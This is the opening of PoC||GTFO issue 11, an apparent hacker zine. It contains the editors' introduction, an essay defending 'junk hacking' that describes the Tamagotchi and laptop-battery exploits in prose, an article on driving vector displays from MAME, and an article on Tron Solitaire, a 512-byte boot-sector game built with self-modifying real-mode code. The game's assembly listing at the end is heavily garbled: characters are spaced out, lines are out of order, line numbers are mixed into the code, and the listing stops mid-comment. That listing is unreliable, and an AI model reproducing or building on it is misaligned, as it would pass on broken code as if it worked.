PASTOR MANUL LAPHROAIG
AND HIS CLEVER CREW
SET SAIL TOWARD
WELCOMING SHORES OF
THE GREAT UNKNOWN!
11:1 Please Stand and Be Seated 11:6 Phrasebook for ARM Cortex M
11:2 In Praise of Junk Hacking 11:7 Ghetto CFI for x86
11:3 Emulating Star Wars on a Vector Display 11:8 Tourist’s Guide to the MSP430
11:4 Tron in 512 Bytes 11:9 This PDF is a Webserver
11:5 Defeating the E7 Protection
11:10 In Memoriam: Ben “bushing” Byer
Heidelberg, Baden-Württemberg
Funded by our famous Single Malt Waterfall and
Pastor Laphroaig’s Рентгениздат Gospel Choir,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат. Denn was man Schwarz auf Weiß besitzt, kann man getrost nach Hause tragen.
0, $0 USD, £0, 0 RSD, 0 SEK, $50 CAD. pocorgtfo11.pdf. March 17, 2016.
1Legal Note: Sony relies on the unsubstantiated residency of the unnamed defendant “Bushing” as a basis
for California being the best forum. However, “Bushing” has not been identified, named, served, or connected
with Mr. Hotz in any way that could warrant bringing the only identifiable defendant out to California. If
“Bushing” does exist and can be ascertained at a later date, Sony would have to amend the complaint
to properly name him/her which has not occurred. Thus, New Jersey is an alternative forum that exists
to provide Sony with adequate relief. If Sony can obtain jurisdiction by merely including a hypothetical
defendant by the name of “Bushing” that may live in California, then any Plaintiff can file suit in California
and obtain jurisdiction by adding “Bushing” as a defendant.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror–don’t merely link!–pocorgtfo11.pdf and our other issues far and wide, so our articles can help fight
the coming robot apocalypse. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/
http://www.sultanik.com/pocorgtfo/
Technical Note: Thanks to a Funky File Format Fire Sale, the file named pocorgtfo11.pdf is a polyglot
in HTML, PDF, ZIP, and Ruby that executes as a quine over HTTP.
laphroaig% ruby pocorgtfo11.pdf
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland. Secret government labs in Canada may use P3 (280 mm x 430 mm) if they like, but even the
Americans on our staff will laugh at the use of awkward standards of measure. The outermost sheet should
be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo11.pdf -o pocorgtfo11-book.pdf
Preacherman
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
and sundry others
21
Please stand; now, please be seated.
Eric Davisson contributes a 512-byte game for
the PC BIOS on page 9. He discusses some nifty
tricks for self-rewriting code in 16-bit Real Mode
and shows that the fancier features of an operat-
ing system aren’t needed to have a little fun—and
that programming a constrained environment can
be great fun indeed!
Neighbors, please join me in reading this twelfth
release of the International Journal of Proof of Con-
cept or Get the Fuck Out, a friendly little collection
of articles for ladies and gentlemen of distinguished
ability and taste in the field of software exploita-
tion and the worship of weird machines. This is our
twelfth release, given on paper to the fine neighbors
of Heidelberg.
If you are missing the first eleven issues, we the
editors suggest pirating them from the usual loca-
tions, or on paper from a neighbor who picked up a
copy of the first in Vegas, the second in São Paulo,
the third in Hamburg, the fourth in Heidelberg, the
fifth in Montréal, the sixth in Las Vegas, the seventh
from his parents’ inkjet printer during the Thanks-
giving holiday, the eighth in Heidelberg, the ninth
in Montréal, the tenth in Novi Sad or Stockholm, or
the eleventh in Washington, D.C.
Our own Pastor Laphroaig opens this issue on
page 4 by confessing to be a fan of junk hacking! He
tells us to ignore the publicity and drama around
a hack, to ignore even its target and its CVE. In-
stead, we should learn the mechanism of the hack,
the clever tricks that make it work. Programming
these mechanisms in nifty ways, be they ever so old,
is surely not “junk”—think of it instead as an edu-
cational journey to far and exotic shores, on which
this issue’s great crew of authors stands ready to
take you, neighbors!
In a fit of nostalgia for the good old vector ar-
cade games, Trammel Hudson extended MAME to
support native vector displays of the 1983 Star Wars
arcade game on both his Tektronix 1720 scope and
a Vectrex home vector display. Find it on page 6.
On page 15, Peter Ferrie describes his work to-
ward a universal bypass for the E7 protection mode
used on a number of Apple ][ disks. This is a follow
up to his encyclopedic coverage of protection modes
for this platform in PoCkGTFO 10:7.
Ryan Speers and Travis Goodspeed have begun
a series of tourist guides, intended to quickly intro-
duce reverse engineers to a new platform. Page 20
provides a lightning-fast introduction to ARM’s
Cortex M series, which you’ll find in modern devices
with a megabyte or less of Flash memory. Page 28
contains similar notes for the Texas Instruments
MSP430, MSP430X, and MSP430X2 architectures,
a 16-bit competitor to the PIC and AVR.
At this journal, we generally frown upon defense,
not because it is easy, but because it is so damned
hard to describe properly. On page 24, Jeffrey Crow-
ell presents a poor man’s method of patching 32-bit
x86 binaries to enforce the control flow graph. With
examples in Radare2 and legible C, you’ll be itching
to write your own generic patchers for large binaries
this weekend.
Page 33 describes how Evan Sultanik made this
PDF—the one that you’re reading—into a poyglot
webserver quine in Ruby with its own самиздат
PoCkGTFO mirror.
It is with great sadness that we dedicate this re-
lease to the memory of our neighbor Ben Byer, the
“hypothetical defendant by the name of ‘Bushing’ ”
who inspired many of us to put pwnage before poli-
tics, to keep on hacking. We’re gonna miss him.
–——–
———
—–—–
On page 40, the last page, we pass around the
collection plate. We’re not interested in your dimes,
but we’d love some nifty proofs of concept. And re-
member, one hacker’s “junk hacking” may hold the
nifty tricks needed for another’s treasured exploit!
32
In Praise of Junk Hacking
by Pastor Manul Laphroaig
in polite dissent to Daily Dave.
sider how much more stable this would be than giv-
ing the host responsibility for managing the state.
Read about how a complete development kit is avail-
able for the platform, about how the firmware up-
date is flashed out of order to prevent bricking the
battery.
Read about how the Texas Instruments
BQ20Z80 chip is a CoolRISC 816 microcontroller,
which was identified by Dion Blazakis through
googling opcodes when the instruction set was
not documented by the manufacturer. See that
its mask ROM functions are well documented in
sluu225.pdf. 4 Read about how code memory
erases not to all ones, as most architectures would,
but to ff ff 3f because that’s a NOP instruction.
Read about how this architecture wasn’t sup-
ported by IDA Pro, but that a plugin disassem-
bler wasn’t much trouble to write. 5 Read about
how instructions on the CoolRISC platform are 22
bits wide and 24-bit aligned, so code might begin at
any 3-byte boundary. See how Charlie bypasses the
firmware checksums in order to inject his own code.
Can you really read all thirty-eight pages with-
out learning one new trick, without learning any-
thing nifty? Without anything more to say than
your disappointment that batteries shipped with the
default password? He who has eyes to read, let him
read!
–——–
———
—–—–
Loyal readers of this journal will remember
PoCkGTFO 2:4, in which Natalie Silvanovich gets
remote code execution in a Tamagotchi’s 6502 mi-
crocontroller through a plug-in memory chip. “Big
whoop,” some jerk might say, “local control of mem-
ory is getting root when you already have root!”
Re-read her article; it packs a hell of a lot into
just two pages. The memory that she controls is just
data memory, containing some fixed-size sprites and
single byte describing the game that the cartridge
should load. The game itself, like all other code, is
already in the CPU’s unwritable Mask ROM.
Gather round y’all, young and old, and listen to
a story that I have to tell.
Back in 2014, when we were all eagerly waiting
for </SCORPION> to debut on the TV network for-
merly known as the Columbia Broadcasting System,
a minor ruckus was raised over Junk Hacking. The
moral fiber of the youth, it was said, was being cor-
rupted by a dozen cheap Black Hat talks on popping
embedded systems with old bugs from the nineties.
Who among us high-brow neighbors would sully the
good name of our profession by hacking an ATM
that runs Windows XP, when breaking into XP is
old hat?
Let’s think for just a minute and consider the
best examples of neighborly junk hacking. Per-
haps we’ll find that rather than being mere publicity
stunts, junk hacking is a way to step back from the
daily grind of confidential consulting work, to share
nifty tricks and techniques that are often more in-
teresting than the bug itself.
–——–
———
—–—–
Our first example today is from everyone’s fa-
vorite doctor in a track suit, Charlie Miller. If you
have the misfortune of reading about his work in
the lay press, you might have heard that he could
blow up laptop batteries by software, 1 or that he was
recklessly irresponsible by disabling the power train
of a car with a reporter inside. 2 That is to say, from
the lay press articles, you wouldn’t know a damned
thing about what mechanism he experimented with.
So please, read the fucking paper, the battery
hacking paper, 3 and ignore what CNN has to say
on the subject. Read about how the Smart Battery
Charger (SBC) is responsible for charging the bat-
tery even when the host is unresponsive, and con-
1 If
you RTFP, you’ll note that the Apple batteries have a separate BQ29312 Analog Frontend (AFE) to protect against such
nonsense, as well as a Matsushita MU092X in case the BQ29312 isn’t sufficient.
2 One time, my Studebaker ran out of gas on the highway. Maybe we should start a support group?
3 unzip pocorgtfo11.pdf batteryfirmware.pdf
4 unzip pocorgtfo11.pdf sluu225.pdf
5 unzip pocorgtfo11.pdf bq20z80.py
4So given just one byte of maneuverability, Na-
talie tried each value, discovering that a switch()
statement had no default case, so values above
0x20 would cause a reboot, while really high val-
ues, above 0xD8, would sometimes jump the game
to a valid screen.
At this point she had a good idea that she was
running off the end of a jump table, but as is com-
mon in the best junk hacking, she had no copy
of the code and needed an exploit to extract the
code. She did, however, know from die photographs
and datasheets that the chip was a GeneralPlus
GPLB52X with a 6502 instruction set. So she came
up with the clever trick of making a background pic-
ture that, when loaded into LCD RAM, would form
a NOP sled into shellcode that dumped memory out
of an I/O port.
By reverse engineering that memory dump, she
was able to replace her hail-Mary of a NOP sled
with perfectly placed, efficient shellcode containing
any number of fancy new features. You can even
send your Tamagotchi to 30C3, if you like.
The point of her paper is no more about securing
the Tamagotchi than Charlie’s is about securing a
battery. The point of the paper is to teach the reader
the mechanism by which she dumped the firmware,
and if you can read those two pages without learning
something new about exploiting a target for which
you have no machine code to disassemble, you aren’t
really trying. He who has eyes to read, let him read!
And this is the crux of the matter, dear neigh-
bors. We become jaded by so much garbage on TV,
so much crap in the news, and so many attempts
to straight-jacket the narrative of security research
by the mistaken belief that it must involve security.
But the very best security research doesn’t involve
security! The very best research has no CVE, de-
mands no patch, and has no direct relation to any-
thing from your grandmother’s credit card number
to your server’s shadow file.
The very best research is that which teaches you
something new about the mechanism by which a ma-
chine functions. It teaches you how to build some-
thing, how to break something, or how to take some-
thing apart, but most of all it teaches you how the
hell that thing really works.
So to hell with the target and to hell with the
reporters. Teach me how a thing works, and teach
me the techniques that you needed to do something
clever with it. But if you casually dismiss the clever
tricks learned from hacking an Apple ][, a battery,
or a Tamagotchi, I’m afraid that I’ll have to ask you
politely, but firmly, to get the fuck out. 6
6 Remember, though, that redemption is for everyone, and that one day you may find a strange and radiant machine you
will treasure for the cleverness of its mechanisms, no matter if others call it junk. On that day we will welcome you back in the
spirit of PoC!
53
Emulating Star Wars on a Vector Display
by Trammell Hudson
Star Wars was one of Atari’s best vector games—
possibly, the pinnacle of the golden age of arcade
games. It featured 3D color vector graphics in an
era when most games were low-resolution bitmaps.
It also had digitized voice samples from the movie,
while its contemporary games were still using 8-bit
beeps.
The graphics were 3D wireframe renderings that
included features like the Tie fighters breaking up
when they were hit by the player’s lasers. There
was no hidden wireframe removal; at this time it
was not computationally feasible to do so.
3.1
Digital to Analog Converters
There were two common ways to generate the ana-
log voltages to steer the electron beam in the vector
monitor. Most early Atari games used the “Digital
Voltage Generator,” which used dual 10-bit DACs
that directly output -2.5 to +2.5 volt signals. Star-
wars, however, used the “Analog Voltage Genera-
tor,” in which the DACs generated the slope of the
line, and opamps integrated the values to produce
the output voltage. This is significantly more com-
plex to emulate, and modern DACs and microcon-
trollers make it fairly easy to generate the analog
voltages to drive the displays with resolution exceed-
ing the precision of the old opamps.
The Starwars ROMs, along with almost all of
Atari’s vector games, can be emulated with MAME
and the vectors extracted for display on actual vec-
tor hardware. Even though modern screens have ex-
ceeded the 10-bit resolution used by the game, the
unique quality of a vector monitor is hard to convey.
When compared to the low-resolution bitmap on a
television monitor, the sharp lines and high resolu-
tion of the vectors are really stunning.
6The open source hardware v.st quad-DAC
boards output do 1.2 million samples per second,
which is enough to steer the beam using Bresen-
ham’s line algorithm at a resolution of about 12 bits.
While this is generating discrete points, the analog
nature of the CRT means that smooth lines will be
traced in the phosphor. The ARM’s DMA engine
clocks out the X and Y coordinates as well as the in-
tensity, allowing the CPU to process incoming data
from the USB serial connection without disrupting
the output.
Source code for the v.st is available online or as
an attachment to this PDF. 7
3.2
3.3
Gameplay
Figure 2 compares the Tek 1720 on the left to the
Vectrex on the right, which isn’t very impressive on
paper but will animate as a short video if you open
pocorgtfo11.pdf in Adobe Reader. A longer video
showing some of the different scenes is available. As
the number of line segments increases, the slower
display starts to flicker.
The game was played with a yoke, so the Y-axis
mapping might seem backwards for a normal joy-
stick. You can invert it in MAME by pressing Tab
to bring up the config menu, selecting “Analog Con-
trols” and “AD Stick Y Reverse”.
While playing it on a small Vectrex or even
smaller vectorscope doesn’t quite capture the thrill
of the arcade, it is quite fun to relive the vector art
æsthetic at home and hear the digitized voice of Obi-
Wan Kenobi telling you that “the Force will be with
you, always.”
Displays
Two inexpensive vector displays are the Tek-
tronix 1720 vectorscope, a piece of analog NTSC
video test equipment from a television studio, and
the Vectrex, one of the only home vector console
systems. The Tek uses an Electrostatic deflection
CRT, which gives it very high bandwidth and al-
most instant transits between points, but at the
cost of a very small deflection angle that results in
a tiny screen and a very deep tube. The Vectrex
has a magnetic deflection CRT, which allows it to
be much shallower and significantly larger, but it re-
quires many microseconds for the beam to stabilize
in a new position. As a result, the DAC needs to
take into account the “inertia” of the beam and wait
for it to catch up.
7 git clone https://github.com/osresearch/vst
unzip pocorgtfo11.pdf vst.tar.bz2
7MSB
D9
D8
D7
D6
D5
D4
D3
D2
D1
D0
LOAD
Up/Down
Clock
D9
D8
D7
D6
D5
D4
D3
D2
D1
D0
LOAD
U/D
Clk
Q9
Q8
Q7
Q6
Q5
Q4
Q3
Q2
Q1
Q0
B1
B2
B3
B4
B5
B6
B7
B8
B9
B10
DAC
Vmax/2
SW
C
VOUT
-512 to 511 =
Buffer -Vmax/2 to Vmax/2
S/H
Counter
Sample and Hold
Figure 1 – Digital to Analog Signal Generator
Figure 2 – Tek 1720 vs Vectrex
84
Master Boot Record Nibbles; or,
One Boot Sector PoC Deserves Another
by Eric Davisson
I was inspired by the boot sector Tetranglix game
by Juhani Haverinen, Owen Shepherd, and Shikhin
Sethi published as PoCkGTFO 3:8. I feel more cre-
ative when dealing with extreme limitations, and
512 bytes (510 with the 0x55AA signature) of real-
mode assembly sounded like a great way to learn
BIOS API stuff. I mostly learned some int 0x10
and 0x16 from this exercise, with a bit of int 0x19
from a pull request.
I found that there were only two small things I
needed to do in order to write this code: make sure
the boot image file is exactly 512 bytes and make
sure the last two bytes are 0x55AA. That’s it! All
the rest of the code is all yours. You could literally
start a file with 0xEBFE (two-byte unconditional in-
finite “jump to self” loop), have 508 bytes of nulls
(or ANYTHING else), and end with 0x55AA, and
you’ll have a valid “boot” image that doesn’t error
or crash. So I started with that simple PoC and
built my way up to a game.
The most dramatic space savers were also the
least interesting. Instead of cool low level hacks, it
usually comes down to replacing a bad algorithm.
One example is that the game screen has a nice blue
border. Initially, I drew the top and bottom lines,
and then the right and left lines. I even thought
I was clever by drawing the right and left lines to-
gether, two pixels at a time—because drawing a right
pixel and incrementing brings me to the left and
one row down. I used this side-effect to save code,
rewriting a single routine to be both right and left.
However, all of this was still too much code. I
tried something simpler: first splashing the whole
screen with blue, then filling in a black box to only
leave the blue border. The black box code still
wasn’t trivial, but much less code than the previ-
ous method. This saved me sixteen precious bytes!
Less than a week after I put this on Github, my
friend Darkvoxels made a pull request to change the
game-over screen. Instead of splashing the screen
red and idling, he just restarts the game. I liked
this idea and merged. As his game-over is just a
simple int 0x19, he saved ten bytes.
Although I may not have tons of reusable subrou-
The game looks a lot more like snake or nibbles,
except that the tail never follows the head, so the
game piece acts less like a snake and more like a
streak left in Tron. I called it Tron Solitaire be-
cause there is only one player. This game has an
advanced/dynamic scoring system with bonus and
trap items, and progressively increasing game speed.
This game can also be won.
I’ve done plenty of protected mode assembly and
machine code hacking, but for some reason have
never jumped down to real mode. Tetranglix gave
me a hefty head start by showing me how to do
things like quickly setting up a stack and some video
memory. I would have possibly struggled a little
with int 0x16 keyboard handling without this code
as a reference. Also, I re-used the elegant ran-
dom value implementation as well. Finally, the PIT
(Programmable Interval Timer) delay loop used in
Tetranglix gave me a good start on my own dynam-
ically timed delay.
I also learned how incredibly easy it was to get
started with 16-bit real mode programming. I owe
a lot of this to the immediate gratification from
utilities like qemu. Looking at OS guides like the
osdev.org wiki was a bit intimidating, because
writing an OS is not at all trivial, but I wanted
to start with much less than that. Just because I
want to write real mode boot sector code doesn’t
mean I’m trying to actually boot something. So a
lot of the instructions and guides I found had a lot
of information that wasn’t applicable to my unusual
needs and desires.
9tines, I still avoided inlining as much as possible. In
my experience, inlining is great for runtime perfor-
mance because it cuts out the overhead of jumping
around the code space and stack overhead. How-
ever, this tends to create more code as the tradeoff.
With 510 effective bytes to work with, I would gladly
trade speed for space. If I see a few consecutive in-
structions that repeat, I try to make a routine of
it. overhead than I had to spare. I could also use a
dedicated register, but there are too few of those.
On the other hand, assuming I’m actually using this
dynamic data, it’s going to end up being part of an
operand in the machine code, which is what I would
consider its persisted location. (Not a register, not
the stack, but inside the actual code.)
I also took a few opportunities to use self-
modifying code to save on space. No longer do I
have to manually hex hack the w bit in the rwx at-
tribute in the .text section of an ELF header; real
mode trusts me to do all of the “bad” things that
dev hipsters rage at me about. So the rest of this
article will be about these hacks. As the pixel streak moves around on the game-
board, the player gets one point per character move-
ment. When the player collects a bonus item of
any value, this one-point-per gets three added to it,
becoming a four-points-per. If another additional
bonus item is collected, it would be up to 7 points.
The code to add one point is selfmodify: add ax,
1. When a bonus item is collected, the routine
for doing bonus points also has this line add byte
[selfmodify + 2], 3. The +2 offset to our add
ax, 1 instruction is the byte where the 1 operand
was located, allowing us to directly modify it.
Two of the self-modifying code hacks in this code
are similar in concept. There are a couple of places
where I needed something similar to a global vari-
able. I could push and pop it to and from the stack
when needed, but that requires more bytes of code
10Also, instead of using an elaborate string print
function, I have a loop to print a character at a
pointer where my “YOU WIN!” string is stored
(winloop: mov al, [winmessage]), and then use
self-modifying code to increment the pointer on each
round. (inc byte [winloop + 0x01])
The most interesting self-modifying code in this
game changes the opcode, rather than an operand.
Though the code for the trap items and the bonus
items have a lot of differences, there are a significant
amount of consecutive instructions that are exactly
the same, with the exception of the addition (bonus)
or the subtraction (trap) of the score. This is be-
cause the score actually persists in video memory,
and there is some code overhead to extract it and
push it back before and after adding or subtracting
to it.
So I made all of this a subroutine. In my as-
sembly source you will see it as an addition (math:
add ax, cx), even though the instruction initialized
there could be arbitrary. Fortunately for me, the
machine code format for this addition and subtrac-
tion instruction are the same. This means we can
dynamically drop in whichever opcode we want to
use for our current need on the fly. Specifically, the
add I use is ADD r/m16, r16 (0x01 /r) and the sub
I use is SUB r/m16, r16 (0x29 /r). So if it’s a bonus
item, we’ll self modify the routine to add (mov byte
[math], 0x01) and call it, then do other bonus re-
lated instructions after the return. If it’s a trap item,
we’ll self modify the routine to subtract (mov byte
[math], 0x29) and call it, then do trap/penalty in-
structions after the return. This whole hack isn’t
without some overhead; the most exciting thing is
that this hack saved me one byte, but even a single
byte is a lot when making a program this small!
On a less technical note, this adds to the strategy
of the game; it discourages just filling the screen up
with the streak while avoiding items (so as to not
create a mess) and just waiting out the clock. In
fact, it is nearly impossible to win this way. To win,
it is a better strategy to get as many bonuses as
early as possible to take advantage of this progres-
sive scoring system.
Another self-modifying code trick is used on
the “win” screen. The background to the “YOU
WIN!” screen does some color and character cycling,
which is really just an increment. It is initialized
with winbg: mov ax, 0, and we can later incre-
ment through it with inc word [winbg + 0x01].
What I also find interesting about this is that we
can’t do a space saving hack like just changing mov
ax, 0 to xor ax, ax. Yes, the result is the same;
ax will equal 0x0000 and the xor takes less code
space. However, the machine code for xor ax, ax is
0x31c0, where 0x31 is the xor and 0xc0 represents
“ax with ax.” The increment instruction would be
incrementing the 0xc0 byte, and the first byte of the
next instruction since the word modifier was used
(which is even worse). This would not increment an
immediate value, instead it would do another xor of
different registers each time.
I hope these tricks are handy for you when writ-
ing your own 512-byte game, and also that you’ll
share your game with the rest of us. Complete code
and prebuilt binaries are available in the ZIP portion
of this release. 8
8 unzip
pocorgtfo11.pdf tronsolitare.zip
1183
sub bx ,
mov ax ,
; p r o g r e s s i v e ) game
; b x = 4 − (0 −3)
; g e t i t i n t o ax
ax
bx
85
87
89
91
93
mov bx ,
add bx ,
[ 0 x046C ] ; Get t i m e r s t a t e
ax
; Wait 1−4 t i c k s ( p r o g r e s s i v e
; difficulty )
; add bx , 8
; u n p r o g r e s s i v e l y slow cheat
;#CHEAT ( comment a b o v e l i n e o u t and uncomment
; this line )
delay :
cmp [ 0 x046C ] , bx
jne d e l a y
95
97
99
; Get k e y b o a r d
mov ah , 1
i n t 0 x16
jz persisted
state
; i f no k e y p r e s s , jump t o
; p e r s i s t i n g move s t a t e
101
1
3
5
; Tron S o l i t a r e
;
∗ T h i s i s a PoC b o o t s e c t o r ( <512 b y t e s ) game
;
∗ C o n t r o l s t o move a r e j u s t up /down/ l e f t / r i g h t
;
∗ Avoid t o u c h i n g y o u r s e l f , b l u e b o r d e r , and t h e
; unlucky red 7
7
[ORG 0 x 7 c 0 0 ]
LEFT EQU 75
9 RIGHT EQU 77
UP
EQU 72
11 DOWN EQU 80
13
15
17
19
; add
to
25
113
mov s s ,
mov sp , ax
0 x9c00 ; stack s t a r t s at 0
; 200 h p a s t c o d e s t a r t
mov ax ,
mov es , 0 xb800
ax ; t e x t v i d e o memory
; ES=0xB800
33
35
37
39
41
47
; Some BIOS c r a s h
without
this
49
51
53 rep stosw
cmp di , 0 x 0 e f e
55 jne
57 59 ; i n i t the score
mov di , 0 x 0 f 0 2
mov ax , 0 x 0 1 0 0
61 stosw
63
65
fillin
; P l a c e t h e game
mov di , 0 x07d0
mov ax , 0 x 2 f 2 0
stosw
141
143
145
; A d j u s t f o r n e x t l i n e and column
; i n n e r 78 columns ( e x c l u d e s i d e
; borders )
; p u s h t o v i d e o memory
; Is i t the l a s t col of l a s t l i n e
; we want?
; I f not , l o o p t o n e x t l i n e
69
71
73
75
77
79
81
; Wait Loop
; Get s p e e d
push d i
mov di ,
mov ax ,
pop d i
and ax ,
shr ax ,
mov bx ,
147
149
151
153
155
;#CHEAT ( You can s e t t h e
; s c o re h i g h e r than t h i s )
initial
161
163
piece in s t a r t i n g p o s i t i o n
; starting position
; char to d i s p l a y
165
167
169
; Maybe
place
an i t e m on
screen
171
173
( b a s e d on game/ s c o r e
; Check f o r d i r e c t i o n a l
cmp ah , LEFT
je l e f t
cmp ah , RIGHT
je right
cmp ah , UP
j e up
cmp ah , DOWN
j e down
jmp m a i n l o o p
; O t h e r w i s e , move i n
persisted :
cmp cx , LEFT
je l e f t
cmp cx , RIGHT
je right
cmp cx , UP
j e up
cmp cx , DOWN
j e down
pushes
direction
and
take
last
action
chosen
progress )
0 x0f02
[ es : di ] ; set coordinate
; read data at c o o r d i n a t e
0 xf000
14
4 ; g e t most s i g n i f i c a n t n i b b l e
; now v a l u e 0−3
;#CHEAT, d e f a u l t i s 4 ; make
; amount h i g h e r f o r o v e r a l l
; slower ( but s t i l l
; This w i l l o n l y
jmp m a i n l o o p
happen
before
first
keypress
left :
mov cx , LEFT
; for persistenc
sub di , 4
; coordinate o f f s e t
c a l l movement_overhead
jmp m a i n l o o p
right :
mov cx , RIGHT
c a l l movement_overhead
jmp m a i n l o o p
up :
mov cx , UP
sub di , 1 6 2
c a l l movement_overhead
jmp m a i n l o o p
down :
mov cx , DOWN
add di , 1 5 8
c a l l movement_overhead
jmp m a i n l o o p
correction
movement_overhead :
call collision_check
mov ax , 0 x 2 f 2 0
stosw
call score
ret
157
159
67
mainloop :
c a l l random
135
139
b l a c k e x c e p t f o r remaining b l u e edges
; Almost 2 nd row 2nd column ( need
; t o add 4 )
0 x0020
; s p a c e c h a r on b l a c k on b l a c k
4
78
123
137
; f i l l in a l l
mov di , 1 5 8
ax ,
in :
di ,
cx ,
121
133
; Draw Border
; F i l l in a l l blue
xor di , d i
mov cx , 0 x07d0
; whole s c r e e n s worth
mov ax , 0 x 1 f 2 0
; empty b l u e b a c k g r o u n d
rep stosw
; p u s h i t t o v i d e o memory
mov
fill
add
mov
119
131
43
45
117
129
31
a l , 0 x03
ch , 0 x26
ah
0 x10
buffer
127
mov a l , 0 x03
xor ah , ah
i n t 0 x10
mov
mov
inc
int
115
125
27
29
107
111
; I n i t t h e environment
;
i n i t data segment
;
i n i t s t a c k s e g m e n t a l l o c a t e a r e a o f mem
;
i n i t E/ v i d e o s e g m e n t and a l l o c a t e a r e a o f mem
;
S e t t o 0 x03 /80 x25 t e x t mode
;
Hide t h e c u r s o r
xor ax , ax
; make i t z e r o
mov ds , ax
; DS=0
; C l e a r Keyboard
xor ah , ah
i n t 0 x16
105
109
offsets
21
23
103
175
collision_check :
mov bx , d i
mov ax , [ e s : bx ]
; c u r r e n t l o c a t i o n on s c r e e n
; grab video b u f f e r + current
; location
; Did we Lose?
;#CHEAT: comment o u t a l l 4 o f t h e s e c h e c k s
; (8 i n s t r u c t i o n s ) to be i n v i n c i b l e
cmp ax , 0 x 2 f 2 0
; d i d we l a n d on g r e e n
; ( s e l f )?
j e gameover
cmp ax , 0 x 1 f 2 0
; d i d we l a n d on b l u e
; ( border )?
j e gameover
cmp bx , 0 x 0 f 0 2
; d i d we l a n d i n s c o r e
; coordinate?
j e gameover
cmp ax , 0 x c f 3 7
; magic r e d 7
j e gameover
177
179
181
183
12
; S c o r e Changes
push ax
and ax , 0 x f 0 0 0
cmp ax , 0 x a 0 0 0
j e bonus
cmp ax , 0 x c 0 0 0
; s a v e c o p y o f ax / i t e m
; mask b a c k g r o u n d
; add t o s c o r e
; subtract
from
scoreje penalty
pop ax
185
285
; restore
ax
ret
287
; Are we c l o b b e r i n g
cmp dx , 0 x 0 f 0 2
je redo
other data?
; Is the p i x e l the score?
; Get a d i f f e r e n t v a l u e
187
189
bonus :
mov byte
289
[ math ] ,
191
193
195
0 x01
; make i t e m s t u f f :
; add o p c o d e
routine
use
call itemstuff
stosw
; put data back in
mov di , bx
; restore coordinate
add byte [ s e l f m o d i f y + 2 ] , 3
push d i
mov di , dx
mov ax , [ e s : d i ]
pop d i
cmp ax , 0 x 2 f 2 0
je redo
cmp ax , 0 x 1 f 2 0
je redo
291
293
295
; store
coord
; read data at c o o r d i n a t e
; r e s t o r e coord
; Are we on t h e s n a k e ?
; Are we on
the
border?
297
197
199
ret
penalty :
mov byte
299
[ math ] ,
201
203
205
207
call itemstuff
cmp ax , 0 x e 0 0 0
ja underflow
stosw
mov di , bx
ret
0 x29
; make i t e m s t u f f :
; sub opcode
routine
use
for
integer
305
; put data back in
; restore coordinate
307
309
209
211
213
underflow :
mov ax ,
stosw
mov di ,
ret
311
0 x0100
313
219
221
itemstuff :
pop dx
pop ax
and ax , 0 x 0 0 0 f
i n c ax
s h l ax , 8
push ax
315
225
di
0 x0f02
[ es : di ]
227
229
231
or
pop cx
math :
add ax , cx
push dx
ret
stosw
pop d i
; display
; restore
it
coordinate
317
; store
return
pop cx
; restore
cx
319
; 1−8 i n s t e a d o f 0−7
; m u l t i p l y v a l u e b y 256
; store the value 321
;
;
;
; 325
323
223
mov bx ,
mov di ,
mov ax ,
; D e c i d e on item−t y p e and v a l u e
powerup :
rdtsc
; random
and ax , 0 x 0 0 0 7
; g e t random 8 v a l u e s
mov cx , ax
; c x h a s rand v a l u e
add cx , 0 x 5 f 3 0
; baseline
rdtsc
; random
; b a c k g r o u n d e i t h e r ’A ’ o r ’C ’ ( l i g h t g r e e n
; red )
and ax , 0 x 2 0 0 0
; k e e p b i t 13
add ax , 0 x 5 0 0 0
; t u r n b i t 14 and 12 on
add ax , cx
; item−t y p e + v a l u e
bx
215
217
pixel
; save current coordinate
; p u t rand c o o r d i n c u r r e n t
301
303
; s a n i t y check
; underflow
; D i s p l a y random
push d i
mov di , dx
save coordinate
set coordinate
read data at c o o r d i n a t e
s u b t r a c t from s c o r e
and
327
329
; ’ add ’ i s j u s t a
; restore return
suggestion...
331
333
undo :
ret
gameover :
i n t 0 x19
; Reboot t h e
; t h e game.
; L e g a c y gameover ,
; red screen
; xor di , d i
; mov cx , 80∗25
; mov ax , 0 x 4 f 2 0
; rep stosw
; jmp gameover
doesn ’ t
s y s t e m and
reboot ,
just
restart
ends
with
233
235
237
239
241
243
245
247
249
251
253
255
257
259
261
263
265
score :
push d i
mov di , 0 x 0 f 0 2
; set coordinate
mov ax , [ e s : d i ]
; read data at c o o r d i n a t e
; f o r e a c h mov o f c h a r a c t e r , add ’ n ’ t o s c o r e
; t h i s s o u r c e shows add ax , 1 , however , e a c h
; b o n u s i t e m t h a t i s p i c k e d up i n c r e m e n t s t h i s
; v a l u e b y 3 e a c h t i m e an i t e m i s p i c k e d u p .
; Yes , t h i s i s s e l f m o d i f y i n g code , w h i c h i s
; why t h e l a b l e ’ s e l f m o d i f y : ’ i s s e e n a b o v e , t o
; b e c o n v e n i e n t l y u s e d a s an a d d r e s s t o p i v o t
; o f f o f i n an add b y t e [ s e l f m o d i f y + o f f s e t t o
; ’1 ’] , 3 instruction
s e l f m o d i f y : add ax , 1 ; i n c r e m e n t c h a r a c t e r i n
; coordinate
stosw
; put data back in
pop d i
; Why 0 x f 6 0 0 a s s c o r e c e i l i n g :
; i f i t was s o m e t h i n g l i k e 0 x f f f f , a s c o r e from
; 0 x f f f e would l i k l e y i n t e g e r o v e r f l o w t o a low
; r a n g e ( due t o t h e p r o g r e s s i v e ) s c o r i n g .
; 0 x f 6 0 0 g i v e s a good amount o f s l a c k f o r t h i s .
; However , i t ’ s s t i l l " t e c h n i c a l l y " p o s s i b l e t o
; o v e r f l o w ; f o r example , h i t t i n g a ’ 7 ’ b o n u s
